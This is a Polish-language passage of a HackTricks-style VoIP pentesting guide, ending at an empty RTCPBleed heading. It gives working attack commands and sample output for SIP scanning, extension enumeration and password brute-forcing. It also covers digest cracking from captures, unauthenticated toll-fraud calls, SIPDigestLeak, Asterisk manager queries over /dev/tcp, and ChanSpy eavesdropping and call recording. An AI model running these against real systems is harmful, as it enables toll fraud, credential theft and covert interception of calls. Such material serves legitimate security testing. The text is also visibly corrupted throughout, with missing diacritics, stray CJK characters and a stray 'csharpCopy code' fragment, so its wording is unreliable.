# Pentesting VoIP

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Uzyskaj perspektyw hakera na swoje aplikacje internetowe, sie i chmur**

**Znajd藕 i zgo krytyczne, wykorzystywalne luki w zabezpieczeniach, kt贸re maj rzeczywisty wpyw na biznes.** U偶yj naszych 20+ niestandardowych narzdzi, aby zmapowa powierzchni ataku, znale藕 problemy z bezpieczestwem, kt贸re pozwalaj na eskalacj uprawnie, i u偶yj automatycznych exploit贸w, aby zebra niezbdne dowody, przeksztacajc swoj ci偶k prac w przekonujce raporty.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Podstawowe informacje o VoIP

Aby zacz uczy si, jak dziaa VoIP, sprawd藕:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Podstawowe wiadomoci
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Kody Odpowiedzi

**1xxOdpowiedzi Provisionalne**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xxOdpowiedzi z sukcesem**
```
200 OK
202 Accepted
204 No Notification
```
**3xxOdpowiedzi Przekierowujce**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xxOdpowiedzi o bdach klienta**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xxOdpowiedzi o bdach serwera**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xxGlobal Failure Responses**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Numery Telefon贸w

Jednym z pierwszych krok贸w, kt贸re mo偶e podj Red Team, jest wyszukiwanie dostpnych numer贸w telefon贸w, aby skontaktowa si z firm, korzystajc z narzdzi OSINT, wyszukiwania w Google lub skanowania stron internetowych.

Gdy ju偶 masz numery telefon贸w, mo偶esz skorzysta z usug online, aby zidentyfikowa operatora:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Znajc operatora, kt贸ry wiadczy usugi VoIP, mo偶esz zidentyfikowa, czy firma korzysta z VoIP... Co wicej, mo偶liwe jest, 偶e firma nie zatrudnia usug VoIP, ale u偶ywa kart PSTN, aby poczy swoj wasn central VoIP z tradycyjn sieci telefoniczn.

Rzeczy takie jak automatyczne odpowiedzi z muzyk zazwyczaj wskazuj, 偶e u偶ywane jest VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT information

Ka偶da inna enumeracja OSINT, kt贸ra pomo偶e zidentyfikowa u偶ywane oprogramowanie VoIP, bdzie pomocna dla Red Team.

### Network Enumeration

* **`nmap`** jest w stanie skanowa usugi UDP, ale z powodu liczby skanowanych usug UDP, jest bardzo wolny i mo偶e nie by zbyt dokadny w przypadku tego rodzaju usug.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** z SIPVicious (`sudo apt install sipvicious`): Zlokalizuje usugi SIP w wskazanej sieci.
* `svmap` jest **atwy do zablokowania**, poniewa偶 u偶ywa User-Agent `friendly-scanner`, ale mo偶esz zmodyfikowa kod z `/usr/share/sipvicious/sipvicious` i go zmieni.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** Skanowanie SIPPTS to bardzo szybki skaner dla usug SIP przez UDP, TCP lub TLS. U偶ywa wielowtkowoci i mo偶e skanowa du偶e zakresy sieci. Umo偶liwia atwe wskazanie zakresu port贸w, skanowanie zar贸wno TCP, jak i UDP, u偶ycie innej metody (domylnie u偶yje OPTIONS) oraz okrelenie innego User-Agent (i wicej).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Extra Network Enumeration

PBX mo偶e r贸wnie偶 udostpnia inne usugi sieciowe, takie jak:

* **69/UDP (TFTP)**: Aktualizacje oprogramowania
* **80 (HTTP) / 443 (HTTPS)**: Zarzdzanie urzdzeniem z poziomu sieci
* **389 (LDAP)**: Alternatywa do przechowywania informacji o u偶ytkownikach
* **3306 (MySQL)**: Baza danych MySQL
* **5038 (Manager)**: Umo偶liwia korzystanie z Asteriska z innych platform
* **5222 (XMPP)**: Wiadomoci za pomoc Jabber
* **5432 (PostgreSQL)**: Baza danych PostgreSQL
* I inne...

### Methods Enumeration

Mo偶liwe jest znalezienie **kt贸re metody s dostpne** do u偶ycia w PBX za pomoc `SIPPTS enumerate` z [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analizowanie odpowiedzi serwera

Bardzo wa偶ne jest, aby analizowa nag贸wki, kt贸re serwer wysya z powrotem do nas, w zale偶noci od rodzaju wiadomoci i nag贸wk贸w, kt贸re wysyamy. Za pomoc `SIPPTS send` z [**sippts**](https://github.com/Pepelux/sippts) mo偶emy wysya spersonalizowane wiadomoci, manipulujc wszystkimi nag贸wkami, i analizowa odpowied藕.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Mo偶liwe jest r贸wnie偶 uzyskanie danych, jeli serwer u偶ywa websockets. Za pomoc `SIPPTS wssend` z [**sippts**](https://github.com/Pepelux/sippts) mo偶emy wysya spersonalizowane wiadomoci WS.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Extension Enumeration

Rozszerzenia w systemie PBX (Prywatna Centrala Telefoniczna) odnosz si do **unikalnych identyfikator贸w wewntrznych przypisanych do poszczeg贸lnych** linii telefonicznych, urzdze lub u偶ytkownik贸w w organizacji lub firmie. Rozszerzenia umo偶liwiaj **efektywne kierowanie poczeniami w organizacji**, bez potrzeby posiadania indywidualnych zewntrznych numer贸w telefonicznych dla ka偶dego u偶ytkownika lub urzdzenia.

* **`svwar`** z SIPVicious (`sudo apt install sipvicious`): `svwar` to darmowy skaner linii rozszerze SIP PBX. W koncepcji dziaa podobnie do tradycyjnych wardialer贸w, **zgadujc zakres rozszerze lub podan list rozszerze**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identyfikuje rozszerzenia na serwerze SIP. Sipexten mo偶e sprawdza du偶e zakresy sieci i port贸w.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Mo偶esz r贸wnie偶 enumerowa rozszerzenia/nazwy u偶ytkownik贸w za pomoc metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** to **brute-force enumerator nazw u偶ytkownik贸w** protokou Inter Asterisk Exchange. enumIAX mo偶e dziaa w dw贸ch odrbnych trybach: sekwencyjnego zgadywania nazw u偶ytkownik贸w lub ataku sownikowego.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataki VoIP

### Atak Brute-Force na hasa - online

Po odkryciu **PBX** i niekt贸rych **rozszerze/nazw u偶ytkownik贸w**, Zesp贸 Czerwony mo偶e spr贸bowa **uwierzytelni si za pomoc metody `REGISTER`** do rozszerzenia, u偶ywajc sownika powszechnych hase do przeprowadzenia ataku brute force na uwierzytelnienie.

{% hint style="danger" %}
Zauwa偶, 偶e **nazwa u偶ytkownika** mo偶e by taka sama jak rozszerzenie, ale ta praktyka mo偶e si r贸偶ni w zale偶noci od systemu PBX, jego konfiguracji i preferencji organizacji...

Jeli nazwa u偶ytkownika nie jest taka sama jak rozszerzenie, bdziesz musia **ustali nazw u偶ytkownika, aby przeprowadzi atak brute-force**.
{% endhint %}

* **`svcrack`** z SIPVicious (`sudo apt install sipvicious`): SVCrack pozwala na zamanie hasa dla konkretnej nazwy u偶ytkownika/rozszerzenia na PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack to zdalny program do amania hase dla usug SIP. Rcrack mo偶e testowa hasa dla kilku u偶ytkownik贸w w r贸偶nych adresach IP i zakresach port贸w.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Sniffing VoIP

Jeli znajdziesz sprzt VoIP w **otwartej sieci Wifi**, mo偶esz **przechwyci wszystkie informacje**. Co wicej, jeli jeste w bardziej zamknitej sieci (poczonej przez Ethernet lub chronion Wifi), mo偶esz przeprowadzi **ataki MitM, takie jak** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) midzy **PBX a bram**, aby przechwyci informacje.

Wr贸d informacji sieciowych mo偶esz znale藕 **dane logowania do zarzdzania sprztem**, **numery wewntrzne** u偶ytkownik贸w, **nazwy u偶ytkownik贸w**, adresy **IP**, a nawet **zhardcodowane hasa** i **pakiety RTP**, kt贸re mo偶esz odtworzy, aby **usysze rozmow**, i wicej.

Aby uzyska te informacje, mo偶esz u偶y narzdzi takich jak Wireshark, tcpdump... ale **specjalnie stworzone narzdzie do przechwytywania rozm贸w VoIP to** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Zauwa偶, 偶e jeli **TLS jest u偶ywane w komunikacji SIP**, nie bdziesz w stanie zobaczy komunikacji SIP w czystym tekcie.\
To samo stanie si, jeli u偶ywane s **SRTP** i **ZRTP**, **pakiety RTP nie bd w czystym tekcie**.
{% endhint %}

#### Powiadczenia SIP (Brute-Force hasa - offline)

[Sprawd藕 ten przykad, aby lepiej zrozumie **komunikacj SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example), aby dowiedzie si, jak s **wysyane powiadczenia**.

* **`sipdump`** i **`sipcrack`,** cz **sipcrack** (`apt-get install sipcrack`): Te narzdzia mog **wyodrbni** z **pcap** **uwierzytelnienia digest** w protokole SIP i **przeprowadzi brute-force**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump mo偶e wyodrbni uwierzytelnienia digest z pliku pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack to narzdzie do amania uwierzytelnie digestowych uzyskanych za pomoc zrzutu SIPPTS.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark wyodrbnia dane protokou SIP z pliku PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### Kody DTMF

**Nie tylko dane uwierzytelniajce SIP** mo偶na znale藕 w ruchu sieciowym, mo偶liwe jest r贸wnie偶 znalezienie kod贸w DTMF, kt贸re s u偶ywane na przykad do uzyskania dostpu do **poczty gosowej**.\
Mo偶na wysya te kody w **wiadomociach INFO SIP**, w **audio** lub wewntrz **pakiet贸w RTP**. Jeli kody znajduj si w pakietach RTP, mo偶na wyci t cz rozmowy i u偶y narzdzia multimo do ich ekstrakcji:
```bash
multimon -a DTMF -t wac pin.wav
```
### Darmowe Poczenia / Bdy Konfiguracji Pocze Asterisks

W Asterisk mo偶liwe jest zezwolenie na poczenie **z konkretnego adresu IP** lub z **dowolnego adresu IP**:
```
host=10.10.10.10
host=dynamic
```
Jeli adres IP jest okrelony, host **nie bdzie musia wysya 偶da REGISTER** co jaki czas (w pakiecie REGISTER wysyany jest czas 偶ycia, zazwyczaj 30 minut, co oznacza, 偶e w innym scenariuszu telefon bdzie musia REJESTROWA si co 30 minut). Jednak偶e, bdzie musia mie otwarte porty umo偶liwiajce poczenia z serwerem VoIP, aby odbiera poczenia.

Aby zdefiniowa u偶ytkownik贸w, mo偶na ich zdefiniowa jako:

* **`type=user`**: U偶ytkownik mo偶e odbiera poczenia tylko jako u偶ytkownik.
* **`type=friend`**: Mo偶liwe jest wykonywanie pocze jako peer i odbieranie ich jako u偶ytkownik (u偶ywane z rozszerzeniami)
* **`type=peer`**: Mo偶liwe jest wysyanie i odbieranie pocze jako peer (SIP-trunki)

Mo偶liwe jest r贸wnie偶 nawizanie zaufania za pomoc zmiennej insecure:

* **`insecure=port`**: Umo偶liwia poczenia peer weryfikowane przez IP.
* **`insecure=invite`**: Nie wymaga uwierzytelnienia dla wiadomoci INVITE
* **`insecure=port,invite`**: Oba

{% hint style="warning" %}
Gdy u偶ywane jest **`type=friend`**, **warto** zmiennej **host** **nie bdzie u偶ywana**, wic jeli administrator **bdnie skonfiguruje SIP-trunk** u偶ywajc tej wartoci, **ka偶dy bdzie m贸g si z nim poczy**.

Na przykad, ta konfiguracja byaby podatna na atak:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Darmowe Poczenia / Bdne Konfiguracje Kontekst贸w Asteriska

W Asterisku **kontekst** to nazwany kontener lub sekcja w planie numeracyjnym, kt贸ra **grupuje powizane rozszerzenia, akcje i zasady**. Plan numeracyjny jest kluczowym komponentem systemu Asterisk, poniewa偶 definiuje **jak s obsugiwane i kierowane poczenia przychodzce i wychodzce**. Konteksty s u偶ywane do organizacji planu numeracyjnego, zarzdzania kontrol dostpu i zapewnienia separacji midzy r贸偶nymi czciami systemu.

Ka偶dy kontekst jest definiowany w pliku konfiguracyjnym, zazwyczaj w pliku **`extensions.conf`**. Konteksty s oznaczane nawiasami kwadratowymi, a nazwa kontekstu jest umieszczona w ich wntrzu. Na przykad:
```bash
csharpCopy code[my_context]
```
W kontekcie definiujesz numery wewntrzne (wzorce wybieranych numer贸w) i przypisujesz je do serii dziaa lub aplikacji. Te dziaania okrelaj, jak poczenie jest przetwarzane. Na przykad:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Ten przykad demonstruje prosty kontekst o nazwie "my\_context" z rozszerzeniem "100". Gdy kto wybierze 100, poczenie zostanie odebrane, zostanie odtworzona wiadomo powitalna, a nastpnie poczenie zostanie zakoczone.

To jest **inny kontekst**, kt贸ry pozwala na **wywoanie dowolnego innego numeru**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Jeli administrator definiuje **domylny kontekst** jako:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Ka偶dy bdzie m贸g u偶y **serwera do dzwonienia na dowolny inny numer** (a administrator serwera zapaci za poczenie).
{% endhint %}

{% hint style="danger" %}
Co wicej, domylnie plik **`sip.conf`** zawiera **`allowguest=true`**, wic **ka偶dy** atakujcy bez **autoryzacji** bdzie m贸g dzwoni na dowolny inny numer.
{% endhint %}

*   **`SIPPTS invite`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite sprawdza, czy **serwer PBX pozwala nam na wykonywanie pocze bez autoryzacji**. Jeli serwer SIP ma nieprawidow konfiguracj, pozwoli nam na wykonywanie pocze do numer贸w zewntrznych. Mo偶e r贸wnie偶 pozwoli nam na przekazanie poczenia do drugiego numeru zewntrznego.

Na przykad, jeli tw贸j serwer Asterisk ma z konfiguracj kontekstu, mo偶esz zaakceptowa 偶danie INVITE bez autoryzacji. W takim przypadku atakujcy mo偶e wykonywa poczenia, nie znajc 偶adnego u偶ytkownika/hasa.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Darmowe poczenia / 殴le skonfigurowane IVRS

IVRS oznacza **System Interaktywnej Odpowiedzi Gosowej**, technologi telekomunikacyjn, kt贸ra pozwala u偶ytkownikom na interakcj z systemem komputerowym za pomoc gosu lub ton贸w dotykowych. IVRS jest u偶ywane do budowy **system贸w automatycznego obsugi pocze**, kt贸re oferuj szereg funkcji, takich jak dostarczanie informacji, kierowanie pocze i zbieranie danych od u偶ytkownik贸w.

IVRS w systemach VoIP zazwyczaj skada si z:

1. **Podpowiedzi gosowe**: Wstpnie nagrane wiadomoci audio, kt贸re prowadz u偶ytkownik贸w przez opcje menu IVR i instrukcje.
2. **DTMF** (Dual-Tone Multi-Frequency) sygnalizacja: Tones dotykowe generowane przez nacinicie klawiszy na telefonie, kt贸re s u偶ywane do nawigacji po menu IVR i dostarczania danych.
3. **Kierowanie pocze**: Kierowanie pocze do odpowiedniego celu, takiego jak konkretne dziay, agenci lub numery wewntrzne na podstawie danych od u偶ytkownika.
4. **Zbieranie danych od u偶ytkownik贸w**: Zbieranie informacji od dzwonicych, takich jak numery kont, identyfikatory spraw lub inne istotne dane.
5. **Integracja z systemami zewntrznymi**: czenie systemu IVR z bazami danych lub innymi systemami oprogramowania w celu uzyskania lub aktualizacji informacji, wykonywania dziaa lub wyzwalania zdarze.

W systemie VoIP Asterisk mo偶esz stworzy IVR u偶ywajc planu wybierania (**`extensions.conf`** plik) oraz r贸偶nych aplikacji, takich jak `Background()`, `Playback()`, `Read()` i innych. Te aplikacje pomagaj odtwarza podpowiedzi gosowe, zbiera dane od u偶ytkownik贸w i kontrolowa przepyw pocze.

#### Przykad podatnej konfiguracji
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Poprzedni to przykad, w kt贸rym u偶ytkownik jest proszony o **nacinicie 1, aby zadzwoni** do dziau, **2, aby zadzwoni** do innego, lub **penego numeru wewntrznego**, jeli go zna.\
Wra偶liwo polega na tym, 偶e wskazana **dugo numeru wewntrznego nie jest sprawdzana, wic u偶ytkownik mo偶e wprowadzi 5-sekundowy limit czasu jako peny numer i zostanie on wywoany.**

### Wstrzykiwanie numeru wewntrznego

U偶ywajc numeru wewntrznego takiego jak:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Gdzie **`${EXTEN}`** to **numer wewntrzny**, kt贸ry bdzie wywoywany, gdy **wprowadzony zostanie ext 101**, to co si wydarzy:
```scss
exten => 101,1,Dial(SIP/101)
```
Jednak偶e, jeli **`${EXTEN}`** pozwala na wprowadzenie **wicej ni偶 cyfr** (jak w starszych wersjach Asteriska), atakujcy m贸gby wprowadzi **`101&SIP123123123`**, aby zadzwoni pod numer telefonu 123123123. I to byby wynik:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Zatem poczenie do rozszerzenia **`101`** i **`123123123`** zostanie wysane, a tylko pierwsze z nich nawi偶e poczenie... ale jeli atakujcy u偶yje **rozszerzenia, kt贸re omija jakiekolwiek dopasowanie**, kt贸re jest wykonywane, ale nie istnieje, m贸gby **wstrzykn poczenie tylko do po偶danego numeru**.

## Wra偶liwo SIPDigestLeak

Wra偶liwo SIP Digest Leak dotyczy du偶ej liczby telefon贸w SIP, w tym zar贸wno sprztowych, jak i programowych telefon贸w IP oraz adapter贸w telefonicznych (VoIP na analogowe). Wra偶liwo ta pozwala na **wyciek odpowiedzi na uwierzytelnienie Digest**, kt贸ra jest obliczana na podstawie hasa. Mo偶liwy jest **atak offline na haso**, kt贸ry mo偶e odzyska wikszo hase na podstawie odpowiedzi na wyzwanie.

**[Scenariusz wra偶liwoci std**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Telefon IP (ofiara) nasuchuje na dowolnym porcie (na przykad: 5060), akceptujc poczenia telefoniczne
2. Atakujcy wysya INVITE do telefonu IP
3. Telefon ofiary zaczyna dzwoni, a kto odbiera i odkada suchawk (poniewa偶 nikt nie odpowiada na telefon po drugiej stronie)
4. Gdy telefon zostaje odo偶ony, **telefon ofiary wysya BYE do atakujcego**
5. **Atakujcy wydaje odpowied藕 407**, kt贸ra **prosi o uwierzytelnienie** i wydaje wyzwanie uwierzytelniajce
6. **Telefon ofiary dostarcza odpowied藕 na wyzwanie uwierzytelniajce** w drugim BYE
7. **Atakujcy mo偶e nastpnie przeprowadzi atak brute-force** na odpowiedzi na wyzwanie na swoim lokalnym komputerze (lub w rozproszonej sieci itp.) i odgadn haso

* **Wyciek SIPPTS** z [**sippts**](https://github.com/Pepelux/sippts)**:** Wyciek SIPPTS wykorzystuje wra偶liwo SIP Digest Leak, kt贸ra dotyczy du偶ej liczby telefon贸w SIP. Wynik mo偶na zapisa w formacie SipCrack, aby przeprowadzi atak brute-force za pomoc SIPPTS dcrack lub narzdzia SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call pozwala **u偶ytkownikowi sieciowemu** (kt贸ry na przykad mo偶e by zainteresowany produktem) **wprowadzi** sw贸j **numer telefonu**, aby otrzyma poczenie. Nastpnie zostanie wykonane poczenie do agenta, a gdy **odbierze telefon**, u偶ytkownik zostanie **poczony z agentem**.

Typowy profil Asterisk dla tego to:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Poprzedni profil pozwala na **poczenie z DOWOLNYM adresem IP** (jeli haso jest znane).
* Aby **zorganizowa poczenie**, jak wczeniej okrelono, **nie s potrzebne uprawnienia do odczytu** i **tylko** **originate** w **zapisie** jest wymagane.

Dziki tym uprawnieniom ka偶dy adres IP znajcy haso m贸gby si poczy i wydoby zbyt wiele informacji, takich jak:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Mo偶na za偶da wicej informacji lub dziaa.**

### **Podsuchiwanie**

W Asterisku mo偶liwe jest u偶ycie polecenia **`ChanSpy`**, wskazujc **numer(y) wewntrzny(e) do monitorowania** (lub wszystkie), aby usysze rozmowy, kt贸re si odbywaj. To polecenie musi by przypisane do numeru wewntrznego.

Na przykad, **`exten => 333,1,ChanSpy('all',qb)`** wskazuje, 偶e jeli **zadzwonisz** na **numer wewntrzny 333**, bdzie **monitorowa** **`wszystkie`** numery wewntrzne, **rozpoczynajc nasuchiwanie** za ka偶dym razem, gdy rozpocznie si nowa rozmowa (**`b`**) w trybie cichym (**`q`**), poniewa偶 nie chcemy wchodzi w interakcj. Mo偶esz przechodzi z jednej rozmowy do drugiej, naciskajc **`*`**, lub wybierajc numer wewntrzny.

Mo偶liwe jest r贸wnie偶 u偶ycie **`ExtenSpy`** do monitorowania tylko jednego numeru wewntrznego.

Zamiast sucha rozm贸w, mo偶liwe jest **nagrywanie ich w plikach** przy u偶yciu numeru wewntrznego, takiego jak: 

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Poczenia bd zapisywane w **`/tmp`**.

Mo偶esz r贸wnie偶 sprawi, 偶e Asterisk **wykona skrypt, kt贸ry ujawni poczenie** po jego zakoczeniu.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Wra偶liwo RTCPBleed

